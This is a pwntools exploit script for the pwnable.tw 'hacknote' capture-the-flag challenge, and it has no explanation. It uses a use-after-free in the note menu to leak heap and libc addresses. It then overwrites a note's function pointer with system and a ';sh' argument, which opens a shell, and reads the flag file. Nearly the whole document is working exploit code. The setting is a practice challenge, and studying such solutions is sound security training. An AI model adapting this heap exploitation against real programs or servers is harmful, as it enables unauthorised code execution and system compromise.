#!/usr/bin/env python3

from pwn import *

exe = ELF("./hacknote_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("chall.pwnable.tw", 10102)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b* 0x08048863
            b* 0x0804893D
            c
            set follow-fork-mode parent
            ''')

def add_note(size, content):
    p.sendafter(b'choice :', str(1))
    p.sendafter(b'size :', str(size))
    p.sendafter(b'Content :', content)

def delete_note(idx):
    p.sendafter(b'choice :', str(2))
    p.sendafter(b'Index :', str(idx))

def call_note(idx):
    p.sendafter(b'choice :', str(3))
    p.sendafter(b'Index :', str(idx))

add_note(0x80, b'a'*4) # 0
add_note(0x80, b'b'*4) # 1
# 0 -> 1
delete_note(1)
delete_note(0)
add_note(8, b'c'*4) # 2
call_note(0)

# Leak heap
p.recvuntil(b'c'*4)
heap_leak = u32(p.recvuntil(b'\n', drop=True))
print("Heap leak: " + hex(heap_leak))
heap_base = heap_leak - 0xb0
print("Heap base: " + hex(heap_base))

delete_note(2)
print_note = 0x0804862B
payload = flat(
    print_note,
    heap_base + 0x18
    )
add_note(8, payload) # 3
call_note(1)

# Leak libc
libc_leak = u32(p.recv(4))
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x1b07b0
print("Libc base: " + hex(libc.address))

delete_note(3)
payload = flat(
    libc.sym.system,
    b';sh'
    )
add_note(8, payload) # 4
# GDB()
call_note(1)
p.sendline(b'cat /home/hacknote/flag')

p.interactive()